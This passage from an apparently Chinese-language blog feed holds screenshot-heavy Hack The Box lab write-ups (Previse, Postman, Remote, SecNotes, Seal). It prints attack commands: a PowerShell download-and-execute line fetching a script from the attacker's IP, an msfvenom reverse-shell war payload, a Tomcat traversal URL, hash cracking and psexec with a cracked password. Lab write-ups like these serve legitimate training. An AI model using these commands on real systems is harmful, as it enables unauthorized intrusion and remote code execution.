                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.8ad1xerczrs.webp"
                     
                ></p>
<p>切换用户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.39o1bf6h57c0.webp"
                     
                ></p>
<p>继续提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.3dfitvwwh240.webp"
                     
                ></p>
<p>有个sudo权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.6xxk4cbbjpc0.webp"
                     
                ></p>
<p>貌似是个压缩命令，尝试一下路径劫持</p>
<p>在本地先创建一个gzip文件，内容为反弹shell命令</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.69rc0wtjiyo0.webp"
                     
                ></p>
<p>让靶机下载，添加执行权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.4en49eib6me.webp"
                     
                ></p>
<p>在将tmp目录添加到环境变量</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.7vsfqsnu4o0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.7h4drjcy1800.webp"
                     
                ></p>
<p>之后sudo执行bash脚本，同时监听</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.m5o8xt1yykw.webp"
                     
                ></p>
<p>​	<img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Previse/image.7i8r3dcv68o0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Postman - HackTheBox</title>
    <url>/post/318ed2c71048/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.4ui7tb8twzs0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.6awhpmb33co0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.uhas6tem93k.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.4gs0xzjtbgg0.webp"
                     
                ></p>
<p>先看看80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.2divychllois.webp"
                     
                ></p>
<p>在看看10000</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.360ai416hes0.webp"
                     
                ></p>
<p>添加域名到hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.3iexa4cxzoi0.webp"
                     
                ></p>
<p>一个登录框，弱口令进不去</p>
<p>扫目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.3m0squpia8m0.webp"
                     
                ></p>
<p>这啥啊这是</p>
<p>之前扫出个redis，看看有没有未授权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.3moj0pf9xgy0.webp"
                     
                ></p>
<p>尝试写个shell</p>
<p>盲猜目录为&#x2F;var&#x2F;www&#x2F;html</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.2s2iov7yp4k0.webp"
                     
                ></p>
<p>貌似没有写入权限，换个目录，之前扫目录扫出个upload目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.jxpy5au4xwg.webp"
                     
                ></p>
<p>还是不行，那就写密钥吧</p>
<p>先在本地生成一个，用普通用户权限生成</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.72jkhpdv8fg0.webp"
                     
                ></p>
<p>写入redis目录下，root目录应该写不进去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.1elsps67c0e8.webp"
                     
                ></p>
<p>用密钥文件连接ssh</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.66y42i0h8z40.webp"
                     
                ></p>
<p>提权，linpeas扫一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.7g60nvhn5d40.webp"
                     
                ></p>
<p>扫到一个密钥备份文件，复制出来在本地尝试解密</p>
<p>利用ssh2john爆破密钥</p>
<p><code>https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.3k2sglst25e0.webp"
                     
                ></p>
<p>得到的结果在写入一个文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.443ubvdihoy0.webp"
                     
                ></p>
<p>john进行爆破密码</p>
<p>这个应该就是Matt的密码了，尝试登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.7b3uyktezxk0.webp"
                     
                ></p>
<p>死活登不上去啊，尝试用redis直接su过去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.3poxqllk66c0.webp"
                     
                ></p>
<p>之前扫描时，发现web端是由root权限启动的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.32d1eukkwoi0.webp"
                     
                ></p>
<p>这就意味着如果从web端获取权限的话，就是直接是root了，找一找配置文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.t9kxmz41r8w.webp"
                     
                ></p>
<p>在apache2目录下找到文件，里面有密码，尝试登陆</p>
<p>擦，密码不是这个，是Matt，computer2008</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.78wau826f5k0.webp"
                     
                ></p>
<p>获取版本为1.910，搜一下有无可用exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.1s47jyvl575s.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.5s4mv1mfeoo0.webp"
                     
                ></p>
<p>搜CVE</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.64prl9ri7xk0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.2x65kaxxzrq0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.723wvtgvu4w0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Postman/image.6ll6vcixmhc0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Remote - HackTheBox</title>
    <url>/post/cc8a74409c0d/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.673mkmh4i840.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.2aul8eizrkg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.6raahmfoz400.webp"
                     
                ></p>
<p>先看21端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.7hcniq1jw6c0.webp"
                     
                ></p>
<p>没有东西，而且也上传不了</p>
<p>访问80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.17dcz1xk4qps.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.7k5a7h87bdo0.webp"
                     
                ></p>
<p>在这发现一个登录框</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.3o1rddq7sxu0.webp"
                     
                ></p>
<p>每个页面下面都会显示Umbraco，感觉像是一个cms</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.6dxsbzxbn700.webp"
                     
                ></p>
<p>有一个RCE，但不确定版本也不知道账号密码</p>
<p>2049端口开放，看看有无目录可挂载</p>
<p><code>showmount -e 10.10.10.180</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.4khg0nmoqqo0.webp"
                     
                ></p>
<p>有一个，挂载到本地</p>
<p><code>mount -t nfs 10.10.10.180:/site_backups .</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.2363pclzw3ts.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.12t4enpsz680.webp"
                     
                ></p>
<p>应该是网站目录了</p>
<p>在web.config中确定了版本</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.2g50ovvfrykg.webp"
                     
                ></p>
<p>然后就是需要找到一个账号密码即可</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.2c33ftv0u6zo.webp"
                     
                ></p>
<p>在App_data目录下的Umbraco.sdf文件中找到了账号密码，并且密码给出加密形式为sha1</p>
<p>用hashcat爆破一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.4uom7x4xhb80.webp"
                     
                ></p>
<p><code>hashcat -m 100 hash /usr/share/wordlists/rockyou.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.78n1my1aje80.webp"
                     
                ></p>
<p>尝试登陆一下网站后台</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.5tmzjemn9lo0.webp"
                     
                ></p>
<p>用rce脚本获取shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.36i7n0i5jhu0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.5d1b6nl6ts40.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.od1a2p8z2v4.webp"
                     
                ></p>
<p>检测脚本没有检测到任何可利用exp</p>
<p><code>whoami /all</code>查看权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.5ltkrvvt07g0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.179wwq5gvvpc.webp"
                     
                ></p>
<p>在有这个权限的情况下可以使用<code>potato</code>进行提权，但这台机器是<code>windows server 2019</code>的，这个<code>potato</code>已经不可用了，有一个替代品叫<code>PrintSpoofer</code></p>
<p><code>https://github.com/itm4n/PrintSpoofer</code></p>
<p>原理也差不多，用这个去运行反弹shell的后门，即可获得权限</p>
<p>msf生成反弹后门，将PrintSpoofer和反弹shell都上传到靶机</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.63yam9gzxf40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.1xwus6i5lq9s.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.5yq4oso1ibo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Remote/image.v82xxkwdmq8.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>SecNotes - HackTheBox</title>
    <url>/post/dc6c1f6df573/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.3c7b9aeeeyq0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.55fkwnw93bg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.6ltk655cugc0.webp"
                     
                ></p>
<p>访问80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.qxvxow94jz4.webp"
                     
                ></p>
<p>一个登录框</p>
<p>8808端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.72wdax5jtmw0.webp"
                     
                ></p>
<p>iis起始页</p>
<p>先注册一个进80看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.436uuqmuimq0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.2vdrbsfld9c0.webp"
                     
                ></p>
<p>一个添加文章</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.717m7ya8i8g0.webp"
                     
                ></p>
<p>一个改密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.4mr9o0xegik0.webp"
                     
                ></p>
<p>一个写留言</p>
<p>修改密码不需要原始密码，看看有没有利用可能</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.2uesygy3nn00.webp"
                     
                ></p>
<p>修改后会跳转页面</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.1l0slbehoojk.webp"
                     
                ></p>
<p>这个应该就是管理员了，给他留言一个http连接试试</p>
<p><code>nc -nvlp 80</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.5979ici41t40.webp"
                     
                ></p>
<p>是利用powershell来请求的</p>
<p>看看能不能利用get提交修改密码参数</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.4bdd2ay17o00.webp"
                     
                ></p>
<p>可以，把这个连接提交给管理员</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.5o1tpi71si80.webp"
                     
                ><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.74lm3xpg73k0.webp"
                     
                ></p>
<p>成功登录管理员账号</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.576efffme6o0.webp"
                     
                ></p>
<p>这里发现一个疑似smb的路径，先添加域名到hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.2e9dh9fxhias.webp"
                     
                ></p>
<p>smb连接一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.6wnrtztcl7w0.webp"
                     
                ></p>
<p>这个应该是8808端口的文件</p>
<p>上传一个后门文件，反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.3ozfns1dlfq0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.eybhwv67p4o.webp"
                     
                ></p>
<p><code>powershell -c &quot;iex (new-object system.net.webclient).downloadstring(&#39;http://10.10.14.17/test.ps1&#39;)&quot;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.2dmc0oa6i18g.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.3xxph6gq1ie0.webp"
                     
                ></p>
<p>检测脚本检测到靶机安装了wsl，这玩意类似于docker，并且还在里头安装了一个ubuntu操作系统，尝试连接一下wsl容器</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.4bcvc99g6rq0.webp"
                     
                ></p>
<p>可以执行命令，直接反弹一个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.hq9dehszgc8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.6f9cfbakbjs0.webp"
                     
                ></p>
<p>在当前目录.bash_history中发现administrator的密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.uj9odk8es34.webp"
                     
                ></p>
<p>尝试连接smb</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.1k2to3a62fa8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.3u6t8dclkfs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.7kokywsp7do0.webp"
                     
                ></p>
<p>在administrator目录下发现root.txt，下载下来</p>
<p>虽然有了flag，但并没有实际的权限，考试中要拥有实际的权限在获取flag</p>
<p>利用psexec.py连接靶机</p>
<p><code>https://github.com/fortra/impacket/blob/master/examples/psexec.py</code></p>
<p><code>python psexec.py administrator:&#39;u6!4ZwgwOM#^OBf#Nwnh&#39;@10.10.10.97</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.13d3zcubij7k.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SecNotes/image.10htl5dbag34.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Seal - HackTheBox</title>
    <url>/post/6955d52cd947/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.3dted4dvmc6.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.2qzbwcgqwnw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.4vm3f3k9okc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.6tugbz2ajww0.webp"
                     
                ></p>
<p>访问443端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.6rrf9ne14h80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.61gzkkzdzcw0.webp"
                     
                ></p>
<p>添加一下hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.6nde0n6fuik0.webp"
                     
                ></p>
<p>扫下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.34yryy75fri0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.78sk52h1di40.webp"
                     
                ></p>
<p>继续扫</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.5p7o7h8c3f00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.11gkv8yzf5bk.webp"
                     
                ></p>
<p>要登录</p>
<p>看看8080端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.2kfescf3sfo0.webp"
                     
                ></p>
<p>注册一个进去看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.5htmf0lbtqo0.webp"
                     
                ></p>
<p>在历史文件中找到了tomcat的账号和密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.5dqppv7qt8g0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.6im5rzgscqw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.7hd1p5s0r9c0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.4dkj07y0mm00.webp"
                     
                ></p>
<p>到了后台，找半天没找着war包上传点，搜了一下，需要利用tomcat的目录穿越漏洞</p>
<p><code>https://seal.htb/manager;()/html</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.64ia6yl4hqs0.webp"
                     
                ></p>
<p>生成一个war包</p>
<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.21 LPORT=7777 -f war -o shell.war</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.4xqsh3knheg.webp"
                     
                ></p>
<p>上传</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.4bpysatens40.webp"
                     
                ></p>
<p>监听</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.63xpcluap680.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.2jtqyade4ew0.webp"
                     
                ></p>
<p>发现一个疑似备份的文件夹</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.3wd39sx4pbi0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Seal/image.775drul6zz40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
